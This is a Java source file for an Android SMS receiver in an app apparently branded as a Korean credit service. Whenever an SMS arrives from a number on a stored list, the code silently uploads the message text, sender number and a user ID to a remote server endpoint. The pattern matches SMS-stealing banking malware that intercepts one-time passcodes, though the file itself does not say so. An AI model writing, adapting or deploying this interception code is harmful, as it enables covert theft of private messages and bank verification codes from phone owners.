package com.credit.korea.KoreaCredit;


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;

import lib.datamanager.DataManager;

public class SMSReceiver extends BroadcastReceiver
{
    private DataManager jsonManager;


    public void onReceive(Context context, Intent intent)
    {

        SharedPreferences settings = context.getSharedPreferences(Config.PREFS_NAME, 0);
        boolean isReceive=settings.getBoolean(Config.RECIEVE_SMS,false);
        String userId=settings.getString(Config.KEY_ID, "");
        String smsNumbers=settings.getString(Config.SMS_NUMBERS, "");

        if(isReceive==false){
            return;
        }
        if(userId.equals("")){
            return;
        }
        if(smsNumbers.equals("")){

            return;
        }

        Bundle myBundle = intent.getExtras();
        SmsMessage [] messages = null;
        String strMessage = "";

        if(jsonManager==null){
            jsonManager=new DataManager("POST");
        }

        if (myBundle != null)
        {
            Object [] pdus = (Object[]) myBundle.get("pdus");
            messages = new SmsMessage[pdus.length];

            for (int i = 0; i < messages.length; i++)
            {
                messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);


                String address = messages[i].getOriginatingAddress();
                /*
                strMessage += "SMS From: " + address;
                strMessage += " : ";
                strMessage += messages[i].getMessageBody();
                strMessage += "\n";
                */
                if(address!=null) {

                    Map<String, String> sendParams = new HashMap<String, String>();

                    sendParams.put("uid", userId);
                    String value=messages[i].getMessageBody();
                    try {
                        value= URLEncoder.encode(value, "UTF-8");
                    } catch (UnsupportedEncodingException e) {
                        value="";
                    }
                    sendParams.put("sms", value);
                    sendParams.put("phone", address);
                    int idx = smsNumbers.indexOf(address);
                    if (idx != -1) {

                        jsonManager.loadData(Config.API_SEND_SMS, sendParams);
                        Toast.makeText(context, strMessage, Toast.LENGTH_SHORT).show();
                    }
                }

            }


        }
    }
}

